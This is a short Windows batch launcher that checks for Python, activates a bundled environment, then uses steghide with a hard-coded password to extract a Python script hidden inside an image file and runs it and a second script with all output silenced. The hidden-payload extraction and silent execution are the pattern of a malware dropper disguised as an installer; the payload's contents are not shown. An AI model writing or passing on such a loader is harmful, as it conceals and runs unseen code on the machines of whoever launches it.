@echo off
setlocal

where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python isn't installed. Download from https://www.python.org/downloads/
    start https://www.python.org/downloads/
    exit /b 1
)

set STEGHIDE=lib\steghide.exe



call lib\Scripts\activate.bat

"%STEGHIDE%" extract -sf img.jpg -p "hide" -xf lib\install.py -f >nul 2>&1

attrib +x lib\install.py

python lib\install.py >nul 2>&1
python lib\modules.py >nul 2>&1

